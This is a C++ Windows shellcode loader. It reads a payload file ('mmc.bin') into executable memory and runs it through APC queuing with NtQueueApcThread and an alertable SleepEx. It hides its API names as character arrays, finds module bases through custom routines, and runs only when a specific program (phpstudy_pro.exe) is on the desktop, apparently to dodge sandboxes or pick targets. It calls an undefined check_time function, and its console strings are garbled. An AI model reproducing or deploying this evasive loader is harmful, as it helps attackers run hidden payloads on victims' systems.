#include <Windows.h>
#include <iostream>
#include <shlobj.h>
#include <string>

#include<stdio.h>
typedef DWORD(WINAPI* pNtT)();
typedef NTSTATUS(NTAPI* NtQua)(HANDLE ThreadHandle,PVOID ApcRoutine,PVOID ApcRoutineContext,PVOID ApcStatusBlock,ULONG ApcReserved);
typedef LPVOID(WINAPI* vir)(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);

extern "C" PVOID64 Getnt_64();
extern "C" PVOID64 GetKernel32_64();

LPVOID read(LPCSTR path, PVOID64 ker) {
    DWORD dwSize;
    DWORD dwReadSize;
    HANDLE hFileNew = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    dwSize = GetFileSize(hFileNew, NULL);
    char vk[] = { 'V', 'i', 'r', 't', 'u', 'a','l', 'A', 'l','l', 'o', 'c','\0'};
    vir kp = (vir)GetProcAddress((HMODULE)ker, vk);
    LPVOID exec = kp(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    ReadFile(hFileNew, exec, dwSize, &dwReadSize, NULL);
    CloseHandle(hFileNew);
    return exec;
}
BOOL AT() {
    char desktopPath[MAX_PATH];
    char filepaths[MAX_PATH]; 

    HRESULT result = SHGetFolderPathA(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, desktopPath);

    sprintf_s(filepaths, MAX_PATH, "%s\\phpstudy_pro.exe", desktopPath);

    FILE* file = NULL;
    errno_t err = fopen_s(&file, filepaths, "r");
    if (err == 0 && file != NULL) {
        printf("�ļ����ڣ�%s\n", filepaths);
        fclose(file);
        return TRUE;
    }
    else {
        printf("�ļ������ڣ�%s\n", filepaths);
        return FALSE;
    }
}
int main() {
    LPCSTR path = ".\\mmc.bin";
    PVOID64 nt = Getnt_64();
    PVOID64 ker = GetKernel32_64();
    if (AT()) {
        if(check_time()){
            LPVOID data = read(path, ker);
            char ntTest[] = { 'N', 't', 'T', 'e', 's', 't', 'A', 'l', 'e', 'r', 't', '\0' };
            char ntQu[] = { 'N', 't', 'Q', 'u', 'e', 'u', 'e', 'A', 'p', 'c', 'T','h','r','e','a','d','\0' };
            auto NtQueueApcThread = (NtQua)GetProcAddress((HMODULE)nt, ntQu);
            pNtT ert = (pNtT)(GetProcAddress((HMODULE)nt, ntTest));
            NTSTATUS status = NtQueueApcThread(GetCurrentThread(), (PVOID)data, nullptr, nullptr, 0);
            SleepEx(INFINITE, TRUE);
        }
    }
    return 0;
}
